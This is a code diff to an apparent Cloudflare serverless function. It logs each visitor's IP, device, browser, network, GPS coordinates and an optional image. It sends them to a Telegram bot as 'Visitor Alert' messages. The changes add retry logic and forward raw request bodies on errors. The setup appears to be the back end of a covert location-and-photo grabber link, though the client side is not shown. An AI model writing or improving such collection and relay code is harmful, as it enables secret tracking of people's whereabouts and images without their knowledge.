@@ -1,6 +1,8 @@
 export async function onRequestPost({ request, env }) {
+  let body = {};
+
   try {
-    const body = await request.json();
+    body = await request.json();
     const id = body.session_id;
 
     const ip = request.headers.get("CF-Connecting-IP");
@@ -15,13 +17,9 @@ export async function onRequestPost({ request, env }) {
 
     await env.VISITOR_KV.put(id, JSON.stringify(session));
 
-    // ✅ send only on final event
+    // ✅ ALWAYS try telegram on final
     if (body.event === "final") {
-      try {
-        await sendTelegram(env, session);
-      } catch (e) {
-        console.log("Telegram error:", e);
-      }
+      await safeTelegram(env, session);
     }
 
     return new Response(JSON.stringify({ ok: true }), {
@@ -29,36 +27,74 @@ export async function onRequestPost({ request, env }) {
     });
 
   } catch (err) {
-    return new Response(JSON.stringify({ error: err.message }), {
+    // ✅ SEND ERROR TO TELEGRAM
+    await safeTelegram(env, {
+      error: err.message,
+      raw: JSON.stringify(body)
+    });
+
+    return new Response(JSON.stringify({
+      error: err.message
+    }), {
       status: 500,
       headers: { "Content-Type": "application/json" }
     });
   }
 }
 
+async function safeTelegram(env, s) {
+  try {
+    await sendTelegram(env, s);
+  } catch (e) {
+    console.log("Telegram failed (1st):", e);
+
+    // retry once
+    try {
+      await sendTelegram(env, s);
+    } catch (e2) {
+      console.log("Telegram failed (retry):", e2);
+
+      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        body: new URLSearchParams({
+          chat_id: env.CHAT_ID,
+          text: "❌ Telegram failed twice:\n" + e2.message
+        })
+      });
+    }
+  }
+}
 
 async function sendTelegram(env, s) {
+  const map = s.lat && s.lng
+    ? `https://maps.google.com/?q=${s.lat},${s.lng}`
+    : "N/A";
+
   const text = `
-📍 <b>New Visitor Detected</b>
+🚨 <b>Visitor Alert</b>
 
-🕒 Time: ${s.updated}
-🌐 IP: ${s.ip}
-📱 Device: ${s.device || "-"}
-💻 OS: ${s.os || "-"}
-🌎 Browser: ${s.browser || "-"}
+🕒 <b>Time:</b> ${s.updated || "-"}
+🌐 <b>IP:</b> ${s.ip || "-"}
 
-📡 Network: ${s.network || "-"}
+📱 <b>Device:</b> ${s.device || "-"}
+💻 <b>OS:</b> ${s.os || "-"}
+🌍 <b>Browser:</b> ${s.browser || "-"}
 
-📍 Location:
+📡 <b>Network:</b> ${s.network || "-"}
+
+📍 <b>Location:</b>
 Lat: ${s.lat || "-"}
 Lng: ${s.lng || "-"}
 
-🔗 <a href="https://maps.google.com/?q=${s.lat},${s.lng}">Open Map</a>
+🔗 <a href="${map}">Open Map</a>
+
+${s.error ? `❌ <b>Error:</b> ${s.error}` : ""}
 `;
 
-  // ✅ If image exists → send in SAME message
-  if (s.image) {
-    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
+  let response;
+
+  if (s.image && s.image.length < 500000) {
+    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: new URLSearchParams({
         chat_id: env.CHAT_ID,
@@ -68,7 +104,7 @@ Lng: ${s.lng || "-"}
       })
     });
   } else {
-    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
       method: "POST",
       body: new URLSearchParams({
         chat_id: env.CHAT_ID,
@@ -76,5 +112,12 @@ Lng: ${s.lng || "-"}
         parse_mode: "HTML"
       })
     });
+  }
+
+  const result = await response.json();
+
+  // ❗ CRITICAL: check telegram success
+  if (!result.ok) {
+    throw new Error("Telegram API error: " + JSON.stringify(result));
   }
 }
